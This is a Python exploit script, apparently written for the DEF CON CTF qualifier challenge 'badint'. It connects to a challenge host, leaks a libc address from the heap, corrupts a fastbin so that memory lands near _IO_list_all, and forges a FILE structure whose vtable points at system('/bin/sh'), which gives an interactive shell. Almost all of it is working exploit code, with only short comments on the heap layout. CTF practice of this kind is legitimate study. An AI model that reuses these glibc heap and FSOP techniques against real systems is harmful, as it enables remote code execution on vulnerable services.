import sys
sys.path.append("/home/ubuntu/codes")
from skel import *

import struct

me['r']['tube'] = lambda: remote(host='badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me', port=21813)
me['d']['tube'] = lambda: process('./badint')

def add_chunk(seq, offset, data, lsf=False, leak=False):
    s.sla("SEQ #: ", str(seq))
    s.sla("Offset: ", str(offset))
    s.sla("Data: ", enhex(data))
    s.sla("No: ", "Yes" if lsf else "No")
    s.ru("]\n")
    if lsf:
        d = s.recvline()
        r = re.findall("Assembled \[seq: [0-9]+\]: (.+)\n", d)[0]
        return r

"""
alloc hex buf (input/2)  alloc X
alloc node 0x28 => 0x30  alloc 0x30
alloc buf (hexbuf size)  alloc X+1
free (hex buf)

alloc total size
memcpy(overwrite)

free all nodes from tail
free totalbuf

0. make 0x70 fastbin after will-alloc buffer

fastbin target = 0x6040ed

"""

s = tube()

# alloc over fastbin size
leak = add_chunk(0, 1000, "A"*(0x80), True, True)
libc_leak = u64(unhex(leak[:16]))

add_chunk(1, 0, "B"*0x27)
add_chunk(1, 0, "C"*0x37, True)

if len(sys.argv) == 1:
    libc_base = libc_leak - 0x3c3b78
    print hex(libc_base)
    libc_elf = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    libc = lambda x: libc_base + libc_elf.sym[x]

else:
    libc_base = libc_leak + 0xc48 - 0x00000000003bf400 # 0x00000000003c2400
    print hex(libc_base)
    libc_elf = ELF('./smash_libc.so')
    libc = lambda x: libc_base + libc_elf.sym[x]

target = libc('_IO_list_all')-3

p = p64(target)
add_chunk(2, 464, p.ljust(0x27, "\x00"), True)

add_chunk(1, 0, "\xaa"*0x58, True)

p = p64(0) * 2
# _IO_2_1_stderr_ start
p += "/bin/sh\x00"
p += p64(0) * 2
p += p64(libc('system')) # vtable+0x18
p += p64(libc_base) # write_base
p += p64(libc_base+1) # write_ptr
p = p.ljust(0x34, "\x00")

add_chunk(1, 3, p.ljust(0x44, '\x00'))

p = "\x00"*(0x23-8) + p64(libc('_IO_2_1_stderr_')) # vtable
add_chunk(1, 235-0x23+8, p, True)

s.interactive()

# stdout 0x7f9c84a52400
# unsortedbin 0x7f9c84a517b8
# _IO_file_jumps 0x7f69440b96a0
